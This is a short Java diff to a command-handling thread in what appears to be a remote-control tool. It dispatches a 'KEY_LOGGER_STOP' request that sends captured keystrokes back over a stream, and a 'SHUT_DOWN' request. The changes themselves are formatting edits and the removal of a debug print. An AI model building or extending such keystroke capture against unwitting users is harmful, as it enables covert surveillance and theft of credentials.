@@ -119,9 +119,10 @@ public class ActionThread extends Thread {
 			}
 
 			else if (request.equals("KEY_LOGGER_STOP")) {
-				KeyLogger keyLogger = new KeyLogger(oos, "");
+				KeyLogger keyLogger = new KeyLogger(oos, "");			
 				keyLogger.send_KeyLogger();
-			} else if (request.equals("SHUT_DOWN")) {
+			
+			} else if(request.equals("SHUT_DOWN")) {
 				ShutDown shutDown = new ShutDown(oos);
 				shutDown.shutDown();
 			}
@@ -142,8 +143,7 @@ public class ActionThread extends Thread {
 				throw new Exception();
 			}
 
-			System.out.println("2");
-
+			
 			oos.close();
 			ois.close();
 		} catch (StreamCorruptedException sce) {
